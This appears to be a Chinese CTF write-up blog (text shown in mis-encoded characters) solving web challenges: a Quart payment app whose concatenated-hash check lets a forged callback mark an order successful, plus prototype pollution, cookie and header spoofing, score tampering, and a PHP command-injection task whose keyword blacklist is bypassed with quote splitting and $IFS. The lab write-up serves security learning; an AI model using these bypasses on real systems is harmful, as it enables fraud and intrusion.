class="string">f&#x27;http://localhost:8000/callback&#x27;</span>, data=&#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: transaction.<span class="built_in">id</span>,</span><br><span class="line">            <span class="string">&#x27;user&#x27;</span>: transaction.user,</span><br><span class="line">            <span class="string">&#x27;amount&#x27;</span>: transaction.amount,</span><br><span class="line">            <span class="string">&#x27;desc&#x27;</span>: transaction.desc,</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span>: transaction.status,</span><br><span class="line">            <span class="string">&#x27;hash&#x27;</span>: pbkdf2_hmac(<span class="string">&#x27;sha256&#x27;</span>, data, app.secret_key, <span class="number">2</span>**<span class="number">20</span>).<span class="built_in">hex</span>()</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">create_session</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;uid&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">&#x27;uid&#x27;</span>] = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line">    session[<span class="string">&#x27;balance&#x27;</span>] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> tr <span class="keyword">in</span> <span class="keyword">await</span> Transaction.<span class="built_in">filter</span>(user=session[<span class="string">&#x27;uid&#x27;</span>]).<span class="built_in">all</span>():</span><br><span class="line">        <span class="keyword">if</span> tr.status == TransactionStatus.SUCCESS:</span><br><span class="line">            session[<span class="string">&#x27;balance&#x27;</span>] += tr.amount</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/pay&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">pay</span>():</span><br><span class="line">    transaction = <span class="keyword">await</span> Transaction.create(</span><br><span class="line">        amount=request.args.get(<span class="string">&#x27;amount&#x27;</span>),</span><br><span class="line">        desc=request.args.get(<span class="string">&#x27;desc&#x27;</span>),</span><br><span class="line">        status=TransactionStatus.PENDING,</span><br><span class="line">        user=uuid.UUID(session.get(<span class="string">&#x27;uid&#x27;</span>))</span><br><span class="line">    )</span><br><span class="line">    app.add_background_task(do_callback, transaction)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">f&#x27;/transaction?id=<span class="subst">&#123;transaction.<span class="built_in">id</span>&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/callback&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">callback</span>():</span><br><span class="line">    form = <span class="built_in">dict</span>(<span class="keyword">await</span> request.form)</span><br><span class="line">    data = (</span><br><span class="line">        <span class="string">f&#x27;<span class="subst">&#123;form.get(<span class="string">&quot;id&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;<span class="subst">&#123;form.get(<span class="string">&quot;user&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;<span class="subst">&#123;form.get(<span class="string">&quot;amount&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;<span class="subst">&#123;form.get(<span class="string">&quot;status&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;<span class="subst">&#123;form.get(<span class="string">&quot;desc&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line">    ).encode()</span><br><span class="line">    k = pbkdf2_hmac(<span class="string">&#x27;sha256&#x27;</span>, data, app.secret_key, <span class="number">2</span>**<span class="number">20</span>).<span class="built_in">hex</span>()</span><br><span class="line">    tr = <span class="keyword">await</span> Transaction.get(<span class="built_in">id</span>=<span class="built_in">int</span>(form.pop(<span class="string">&#x27;id&#x27;</span>)))</span><br><span class="line">    <span class="keyword">if</span> k != form.get(<span class="string">&quot;hash&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;403&#x27;</span></span><br><span class="line">    form[<span class="string">&#x27;status&#x27;</span>] = TransactionStatus(<span class="built_in">int</span>(form.pop(<span class="string">&#x27;status&#x27;</span>)))</span><br><span class="line">    tr.update_from_dict(form)</span><br><span class="line">    <span class="keyword">await</span> tr.save()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/transaction&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">transaction</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;id&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;404&#x27;</span></span><br><span class="line">    transaction = <span class="keyword">await</span> Transaction.get(<span class="built_in">id</span>=request.args.get(<span class="string">&#x27;id&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">await</span> render_template(<span class="string">&#x27;receipt.html&#x27;</span>, transaction=transaction)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">await</span> render_template(</span><br><span class="line">        <span class="string">&#x27;flag.html&#x27;</span>,</span><br><span class="line">        balance=session[<span class="string">&#x27;balance&#x27;</span>],</span><br><span class="line">        flag=os.getenv(<span class="string">&#x27;FLAG&#x27;</span>),</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index.html&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(__file__) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">await</span> render_template(<span class="string">&#x27;source-highlight.html&#x27;</span>, code=f.read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">register_tortoise(</span><br><span class="line">    app,</span><br><span class="line">    db_url=<span class="string">&quot;sqlite://./data.db&quot;</span>,</span><br><span class="line">    modules=&#123;<span class="string">&quot;models&quot;</span>: [__name__]&#125;,</span><br><span class="line">    generate_schemas=<span class="literal">True</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></div>
<p>è¿™æ˜¯åŸºäºQuartçš„ä¸€ä¸ªpythonç³»ç»Ÿ<br>è·¯ç”±æœ‰<code>/pay</code> <code>/callback</code> <code>/transaction</code> <code>/flag</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line"># äº¤æ˜“çŠ¶æ€</span><br><span class="line"><span class="keyword">class</span> <span class="symbol">TransactionStatus</span>(<span class="symbol">IntEnum</span>):</span><br><span class="line">    <span class="symbol">SUCCESS</span> = <span class="symbol">0</span></span><br><span class="line">    <span class="symbol">PENDING</span> = <span class="symbol">1</span></span><br><span class="line">    <span class="symbol">FAILED</span> = <span class="symbol">2</span></span><br><span class="line">    <span class="symbol">TIMEOUT</span> = <span class="symbol">3</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p><code>do_callback(transaction)</code> å‘é€ä¸€ä¸ª HTTP POST è¯·æ±‚åˆ° <code>http://localhost:8000/callback</code>ï¼Œé€šçŸ¥äº¤æ˜“ç»“æœã€‚<br>    <code>pbkdf2_hmac</code> ç”ŸæˆåŠ å¯†å“ˆå¸Œï¼Œé˜²æ­¢æ•°æ®è¢«ç¯¡æ”¹ã€‚<br><code>@app.before_request</code>ï¼šæ¯æ¬¡è¯·æ±‚å‰æ‰§è¡Œæ­¤å‡½æ•°<br><code>session[&#39;uid&#39;] = str(uuid.uuid4())</code>ï¼šå¦‚æœç”¨æˆ·æ²¡æœ‰ UIDï¼Œç”Ÿæˆä¸€ä¸ªæ–°çš„ UUIDã€‚<br><code>session[&#39;balance&#39;] = 0</code>ï¼šåˆå§‹åŒ–ä½™é¢ã€‚<br><code>if tr.status == TransactionStatus.SUCCESS:</code><br>            <code>session[&#39;balance&#39;] += tr.amount</code>éå†ç”¨æˆ·çš„æ‰€æœ‰æˆåŠŸäº¤æ˜“ï¼Œå¹¶æŠŠé‡‘é¢ç´¯è®¡ç»™balanceã€‚<br>å¤„ç† <code>/pay</code> è·¯ç”±ï¼š<br>&emsp;è¯»å– amount å’Œ descï¼ˆä» URL å‚æ•°è·å–ï¼‰ã€‚<br>&emsp;åˆ›å»ºä¸€ç¬”äº¤æ˜“ï¼Œåˆå§‹çŠ¶æ€æ˜¯ PENDINGã€‚<br>&emsp;åå°æ‰§è¡Œ do_callbackï¼ˆç”¨äºæ¨¡æ‹Ÿæ”¯ä»˜æµç¨‹ï¼‰ã€‚<br>&emsp;è·³è½¬åˆ° &#x2F;transaction é¡µé¢ï¼ŒæŸ¥çœ‹äº¤æ˜“ä¿¡æ¯ã€‚<br><code>/callback</code>:<br>&emsp;ç”¨POSTè¯·æ±‚æ¥å—æ•°æ®ï¼Œè¿™ä¸ªè·¯ç”±æ¥å—å‚æ•°ï¼ŒéªŒè¯äº¤æ˜“<br>&emsp;è®¡ç®— hashï¼Œå¹¶ä¸è¯·æ±‚çš„ hash è¿›è¡Œå¯¹æ¯”ï¼Œé˜²æ­¢ç¯¡æ”¹ã€‚<br>&emsp;å¦‚æœ hash éªŒè¯å¤±è´¥ï¼Œè¿”å› 403ã€‚<br>&emsp;å¦åˆ™ï¼Œæ›´æ–°äº¤æ˜“çŠ¶æ€ï¼Œå¹¶ä¿å­˜åˆ°æ•°æ®åº“ã€‚<br><code>/transaction</code>:<br>&emsp;æ ¹æ®idæŸ¥è¯¢äº¤æ˜“è¯¦æƒ…<br><code>/flag</code>:<br>&emsp;æ ¹æ®balanceçš„å€¼ï¼Œå¦‚æœè¾¾æˆæŸç§æ¡ä»¶å°±è¾“å‡ºflag<br><br><br>æœ€é‡è¦çš„æ˜¯callbackè¿™ä¸ªæ£€éªŒè·¯ç”±  å®ƒä¼šæŠŠpostæ¥å—çš„æ•°æ®åšä¸€ä¸ªhashæ¥éªŒè¯äº¤æ˜“çš„çœŸå‡ï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶ä¸çŸ¥é“è¿™ä¸ª<code>app.secret_key</code><br>è¿™é‡Œæ˜¯é€šè¿‡<code>/pay</code>æ„é€ ä¸€ä¸ªè®¢å•ï¼Œç„¶åå‘é€åˆ°<code>do_callback</code>åœ¨è¿™é‡Œdataè¢«hashåŠ å¯†ç„¶åç”¨postä¼ ç»™<code>/callback</code><br>è€Œä¸”dataçš„ç»“æ„æ˜¯</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">data = (</span><br><span class="line">    <span class="string">f&#x27;<span class="subst">&#123;transaction.<span class="built_in">id</span>&#125;</span>&#x27;</span></span><br><span class="line">    <span class="string">f&#x27;<span class="subst">&#123;transaction.user&#125;</span>&#x27;</span></span><br><span class="line">    <span class="string">f&#x27;<span class="subst">&#123;transaction.amount&#125;</span>&#x27;</span></span><br><span class="line">    <span class="string">f&#x27;<span class="subst">&#123;transaction.status&#125;</span>&#x27;</span></span><br><span class="line">    <span class="string">f&#x27;<span class="subst">&#123;transaction.desc&#125;</span>&#x27;</span></span><br><span class="line">    ).encode()</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ˜¯å­—ç¬¦ä¸²æ‹¼æ¥çš„å½¢å¼<br><code>/callback</code>é‡Œé¢æ¥å—åˆ°dataè¿›è¡Œhashæ£€éªŒï¼Œç„¶åå°†è®¢å•çš„<code>status</code>ä¿®æ”¹æˆæˆ‘ä»¬ä¼ å…¥çš„å€¼</p>
<p>æ‰€ä»¥æ€»çš„æ€è·¯å°±æ˜¯æ„å»ºè®¢å•ï¼Œç„¶åå¯¹dataæ•°æ®åšæ›´æ”¹ï¼ŒæŠŠstatusæ”¹æˆ0ï¼ˆsuccessï¼‰ è®©balanceæ»¡è¶³æ¡ä»¶<br>æ¯”å¦‚ç°åœ¨çš„åŸå§‹dataæ•°æ®æ˜¯</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">id</span>    user   amount   status   desc </span><br><span class="line"><span class="attribute">aaa</span>   bbb     <span class="number">1000</span>      <span class="number">2</span>       <span class="number">1234</span> </span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬è¦æŠŠstatusæ”¹æˆ0è€Œä¸”è¦dataçš„æ€»çš„å­—ç¬¦ä¸²ä¸å˜  ä¸º aaabbb100021234<br>ä¿®æ”¹ä¹‹åçš„dataä¸º</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">id</span>    user   amount   status   desc </span><br><span class="line"><span class="attribute">aaa</span>   bbb     <span class="number">100</span>      <span class="number">0</span>       <span class="number">21234</span> </span><br></pre></td></tr></table></figure></div>
<p>æ‹¼æ¥ä¹‹åè¿˜æ˜¯aaabbb100021234</p>
<p>æ‰€ä»¥æˆ‘ä»¬æ‰“å¼€bp  åœ¨&#x2F;payè·¯ç”±é‡Œé¢è¾“å…¥?amount&#x3D;1000&amp;desc&#x3D;1234<br>æ„é€ ä¸€ä¸ªè®¢å•ï¼Œè·å¾—id<br>æŠŠå¾—åˆ°çš„idå‘é€åˆ°&#x2F;transaction é‡ŒæŸ¥è¯¢è®¢å•è¯¦æƒ… ?id&#x3D;(your_id) å¯ä»¥å¾—åˆ°hash<br>ç„¶ååˆ°&#x2F;callbackæ ¡éªŒè·¯ç”±é‡Œé¢ä¿®æ”¹è®¢å•çš„æ•°æ® <code>id=(your_id)&amp;user=xxx&amp;amount=100&amp;status=0&amp;desc=21234&amp;hash=xxxx</code><br>è¿”å›okè¯´æ˜æˆåŠŸä¿®æ”¹äº†<br>æœ€åè®¿é—®&#x2F;flagè·¯ç”±ï¼Œå› ä¸ºç°åœ¨çš„balanceå·²ç»è¾¾åˆ°è¦æ±‚äº†ï¼Œæ‰€ä»¥å°±è¿”å›flagäº†</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>MoeCTF_2021web</title>
    <url>/posts/51240.html</url>
    <content><![CDATA[<p>MoeCTF_2021webæ–¹å‘WP</p>
<span id="more"></span>
<h1 id="fakegame"><a href="#fakegame" class="headerlink" title="fakegame"></a>fakegame</h1><p><img src="https://pic1.imgdb.cn/item/67b9d4a7d0e0a243d402260a.png"><br>å…ˆå°è¯•éšä¾¿è¾“å…¥ä¸€äº›æ•°ï¼Œä½†æ˜¯éƒ½æ˜¯å¤±è´¥ï¼ŒbpæŠ“åŒ…çœ‹ä¸€ä¸‹<br><img src="https://pic1.imgdb.cn/item/67b9d5b5d0e0a243d40229fc.png"><br>å‘ç°ä¼ é€’æ•°æ®çš„æ–¹å¼æ˜¯è¿™æ ·çš„ï¼Œå°±å¯èƒ½æ˜¯jsä¸­çš„åŸå‹é“¾æ±¡æŸ“<br>ç¨å¾®è§£é‡Šä¸€ä¸‹è¿™ä¸ªæ˜¯ä»€ä¹ˆï¼šjsä¸­çš„å¯¹è±¡æœ‰ç¤ºä¾‹ï¼Œæ¯”å¦‚æˆ‘ç°åœ¨æœ‰ä¸€ä¸ªDogå¯¹è±¡ï¼Œç„¶åæˆ‘å®ä¾‹åˆ›å»ºäº†ä¸€ä¸ªdog<br>åœ¨æ¯ä¸ªå®ä¾‹å¯¹è±¡ä¸­ä¼šæœ‰ä¸€ä¸ªç§æœ‰çš„å±æ€§<code>__proto__</code>,è¿™ä¸ªå±æ€§æŒ‡å‘å®ƒçš„åŸå‹ï¼Œè¿™ä¸ªåŸå‹å¯ä»¥æ˜¯åŠ¨ç‰©å¯¹è±¡ï¼ŒDogå¯¹è±¡ç»§æ‰¿äº†ä¸€äº›åŸå‹çš„å±æ€§<br>æ¯”å¦‚eatï¼Œsleepï¼Œè¿™æ ·å­æ¯”å¦‚æˆ‘åˆ›å»ºä¸€ä¸ªæ–°çš„å¯¹è±¡Catï¼ŒCatçš„åŸå‹ä¹Ÿæ˜¯åŠ¨ç‰©ï¼Œè¿™æ ·eatï¼Œsleepè¿™äº›å±æ€§å°±ç»§æ‰¿å°±å¥½ï¼Œä¸ç”¨å†é‡å¤å†™<br>åœ¨è¿™é“é¢˜ä¸­å‘ç°å‚æ•°ä¼ é€’çš„æ–¹å¼æ˜¯jsçš„å½¢å¼ï¼Œæ‰€ä»¥è€ƒè™‘ä¿®æ”¹åŸå‹ï¼Œå› ä¸ºé™åˆ¶åªæ˜¯é’ˆå¯¹å‹‡è€…è¿™ä¸ªå¯¹è±¡çš„ï¼Œæˆ‘ä»¬ä¿®æ”¹åŸå‹ä¹‹åè®©å‹‡è€…ç»§æ‰¿<br><img src="https://pic1.imgdb.cn/item/67b9db08d0e0a243d4022cd9.png"><br>è¿™é‡Œæˆ‘ä»¬å…ˆä¿®æ”¹ä¸€äº›<code>__proto__</code>è¿™ä¸ªå±æ€§ï¼Œç„¶åå‘åŒ…ï¼Œå‘ç°è¿”å›çš„è¿˜æ˜¯å¤±è´¥ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿ<br>å› ä¸ºåŸå‹è¿™ä¸ªä¸œè¥¿æ˜¯å¯¹è±¡åˆšè¢«åˆ›å»ºæˆ–è€…æ²¡æœ‰èµ‹å€¼çš„æ—¶å€™æ‰ä¼šè¢«å¯¹è±¡ç»§æ‰¿çš„ï¼Œæˆ‘ä»¬æŠ“åŒ…çš„æ—¶å€™ï¼Œç¬¬ä¸€ä¸ªå‹‡è€…å¯¹è±¡çš„ç”Ÿå‘½ï¼Œæ”»å‡»è¿™äº›å·²ç»è¢«æˆ‘ä»¬èµ‹å€¼äº†<br>ç„¶åä¿®æ”¹äº†åŸå‹çš„å±æ€§ï¼Œå½“æˆ‘ä»¬å†æ¬¡å‘åŒ…çš„æ—¶å€™ï¼Œå› ä¸ºåŸå‹å·²ç»è¢«ä¿®æ”¹äº†ï¼Œæ‰€ä»¥åˆ›å»ºçš„ç¬¬äºŒä¸ªå‹‡è€…å°±ç»§æ‰¿äº†æˆ‘ä»¬ä¿®æ”¹äº†çš„åŸå‹å±æ€§<br>å˜æˆäº†å¼€æŒ‚å‹‡è€…ï¼Œä¸€åˆ€ç æ­»äº†å·¨é¾™ï¼Œæ‹¿åˆ°flag</p>
<h1 id="Web-å®‰å…¨å…¥é—¨æŒ‡åŒ—-â€”POST"><a href="#Web-å®‰å…¨å…¥é—¨æŒ‡åŒ—-â€”POST" class="headerlink" title="Web å®‰å…¨å…¥é—¨æŒ‡åŒ— â€”POST"></a>Web å®‰å…¨å…¥é—¨æŒ‡åŒ— â€”POST</h1><p><img src="https://pic1.imgdb.cn/item/67b9e22ad0e0a243d4022efe.png"><br>ç¯å¢ƒåçš„ï¼Œåšä¸äº†<br>ä½†æ˜¯çœ‹è¿™ä¸ªé¢˜ç›®ï¼Œä¼°è®¡åŸé¢˜ä¹Ÿåªè¦å‘ä¸€ä¸ªpostè¯·æ±‚å°±èƒ½è§£å†³</p>
<h1 id="Web-å®‰å…¨å…¥é—¨æŒ‡åŒ—-â€”GET"><a href="#Web-å®‰å…¨å…¥é—¨æŒ‡åŒ—-â€”GET" class="headerlink" title="Web å®‰å…¨å…¥é—¨æŒ‡åŒ— â€”GET"></a>Web å®‰å…¨å…¥é—¨æŒ‡åŒ— â€”GET</h1><p>é¢˜ç›®ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$moe</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;moe&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$moe</span> == <span class="string">&quot;flag&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>http://node5.anna.nssctf.cn:21557/?moe=flag</code></p>
<h1 id="Web-å®‰å…¨å…¥é—¨æŒ‡åŒ—-â€”-å°é¥¼å¹²"><a href="#Web-å®‰å…¨å…¥é—¨æŒ‡åŒ—-â€”-å°é¥¼å¹²" class="headerlink" title="Web å®‰å…¨å…¥é—¨æŒ‡åŒ— â€” å°é¥¼å¹²"></a>Web å®‰å…¨å…¥é—¨æŒ‡åŒ— â€” å°é¥¼å¹²</h1><p><img src="https://pic1.imgdb.cn/item/67b9e2bdd0e0a243d4022f0e.png"><br>è¿™é‡Œå°±æ˜¯è¦æ‰¾å…³äºVIPçš„ä¸œè¥¿ï¼Œå¯ä»¥ç”¨bpæŠ“åŒ…ï¼Œæˆ‘è¿™é‡Œç›´æ¥ç”¨curlè§£å†³äº†ï¼ŒåŠ å¼ºä¸€ä¸‹å‘½ä»¤ä½¿ç”¨</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MARKDOWN"><figure class="iseeu highlight /markdown"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl http://node5.anna.nssctf.cn:21254/ -v                                                  </span><br><span class="line"><span class="bullet">*</span> Host node5.anna.nssctf.cn:21254 was resolved.</span><br><span class="line"><span class="bullet">*</span> IPv6: (none)</span><br><span class="line"><span class="bullet">*</span> IPv4: 118.195.175.220</span><br><span class="line"><span class="bullet">*</span>   Trying 118.195.175.220:21254...</span><br><span class="line"><span class="bullet">*</span> Connected to node5.anna.nssctf.cn (118.195.175.220) port 21254</span><br><span class="line"><span class="bullet">*</span> using HTTP/1.x</span><br><span class="line"><span class="quote">&gt; GET / HTTP/1.1</span></span><br><span class="line"><span class="quote">&gt; Host: node5.anna.nssctf.cn:21254</span></span><br><span class="line"><span class="quote">&gt; User-Agent: curl/8.11.1</span></span><br><span class="line"><span class="quote">&gt; Accept: <span class="emphasis">*/*</span></span></span><br><span class="line"><span class="quote">&gt; </span></span><br><span class="line"><span class="quote">* Request completely sent off</span></span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Date: Sat, 22 Feb 2025 14:45:41 GMT</span><br><span class="line">&lt; Server: Apache/2.4.38 (Debian)</span><br><span class="line">&lt; X-Powered-By: PHP/7.2.34</span><br><span class="line">&lt; Set-Cookie: VIP=0</span><br><span class="line">&lt; Content-Length: 40</span><br><span class="line">&lt; Content-Type: text/html; charset=UTF-8</span><br><span class="line">&lt; </span><br><span class="line"><span class="bullet">*</span> Connection #0 to host node5.anna.nssctf.cn left intact</span><br><span class="line">You are not VIP,I will give flag to VIP! </span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl -H &quot;Cookie: VIP=1&quot; http://node5.anna.nssctf.cn:21254/ </span><br><span class="line">NSSCTF&#123;c874ce7b-4d2b-4f74-a57a-19bebdc129dd&#125;   </span><br></pre></td></tr></table></figure></div>
<h1 id="2048"><a href="#2048" class="headerlink" title="2048"></a>2048</h1><p><img src="https://pic1.imgdb.cn/item/67b9e45bd0e0a243d4022f90.png"></p>
<p>ä¸€ä¸ª2048çš„æ¸¸æˆç•Œé¢,éšä¾¿æŒ‰é”®ï¼Œæœ€åæç¤ºè¦è¾¾åˆ°50000åˆ†<br>æŸ¥çœ‹é¡µé¢æºä»£ç ï¼Œè¿™é‡Œæœ‰è¿™ä¸ªæ¸¸æˆçš„æºç  ï¼Œç„¶åctrl+fæœç´¢flagæœ‰å…³çš„<br><img src="https://pic1.imgdb.cn/item/67b9e51bd0e0a243d4022fa9.png"><br>å‘ç°è¿™é‡Œè®¡ç®—åˆ†æ•°ç”¨çš„æ˜¯getè¯·æ±‚ï¼Œåœ¨flag.phpç•Œé¢<br>æ‰€ä»¥è®¿é—®<code>http://node5.anna.nssctf.cn:22813/flag.php?score=50001</code>å°±èƒ½æ‹¿åˆ°flag</p>
<h1 id="babyRCE"><a href="#babyRCE" class="headerlink" title="babyRCE"></a>babyRCE</h1><p>é¢˜ç›®ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$rce</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;rce&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$rce</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\&gt;|\&lt;|\&#x27;|\&quot;/i&quot;</span>, <span class="variable">$rce</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$rce</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hhhhhhacker!!!&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œä¼šæ‰§è¡Œ<code>$rce</code>çš„å†…å®¹ï¼Œä½†æ˜¯è¿‡æ»¤äº†å¾ˆå¤šå‡½æ•°<br>å…ˆç”¨lsçœ‹çœ‹æ‰€æœ‰çš„æ–‡ä»¶<br><img src="https://pic1.imgdb.cn/item/67b9ec61d0e0a243d40233d3.png"><br>è¿™é¢˜ä¸­æ²¡æœ‰è¿‡æ»¤<code>\</code><br>åœ¨linuxä¸­å‘½ä»¤ä¸­é—´æœ‰åˆ†éš”ç¬¦ï¼Œå•å¼•å·åŒå¼•å·åæ–œæ åå¼•å·ä¹Ÿå¯ä»¥ç…§æ ·æ‰§è¡Œå‘½ä»¤æ¯”å¦‚<code>l&#39;&#39;s l&quot;&quot;s l\s l``s æ‰€ä»¥ç”¨è¿™ç§æ–¹å¼ç»•è¿‡ï¼Œç©ºæ ¼ç”¨</code>$IFS&#96;ç»•è¿‡,æœ€ååœ¨æºç ä¸­çœ‹åˆ°flag<br><img src="https://pic1.imgdb.cn/item/67b9eeb0d0e0a243d4023524.png"></p>
<h1 id="Do-you-know-HTTP"><a href="#Do-you-know-HTTP" class="headerlink" title="Do you know HTTP"></a>Do you know HTTP</h1><p>é¢˜ç›®æè¿°ï¼šæ£€æŸ¥ä¸€ä¸‹ä½ çš„å­¦ä¹ æˆæœå§<br>ä»…ä»…å­¦ä¹ äº† HTTP è¯·æ±‚å¤´ç›¸å…³å†…å®¹ï¼Œä½ å¯èƒ½ä¼šå‘ç°æµè§ˆå™¨å·²ç»ä¸è¶³ä»¥è®©ä½ ä¾¿åˆ©çš„å»è§£å†³é—®é¢˜äº†ï¼Œè¯•è¯• burpsuiteï¼<br>ç”¨bpæŠ“åŒ… æ ¹æ®åŸå§‹é¡µé¢çš„æç¤ºï¼ŒæŠŠGETè¯·æ±‚æ–¹æ³•æ”¹æˆHS<br><img src="https://pic1.imgdb.cn/item/67b9f02ad0e0a243d4023572.png"><br>å†åŠ ä¸Š<code>X-Forwarded-For: 127.0.0.1</code><br>è€Œä¸”è¿™é‡Œæ¯æ¬¡éƒ½è¦é‡æ–°å‘åŒ…ï¼Œæ”¾åˆ°repeateræ¨¡å—ä¸è¡Œ,ä½†æ˜¯ä¿®æ”¹xffä¹‹åè¿˜æ˜¯æ²¡ååº”ï¼Œæˆ‘å°±ç›´æ¥curlæ›´æ”¹è¯·æ±‚åšäº†</p>
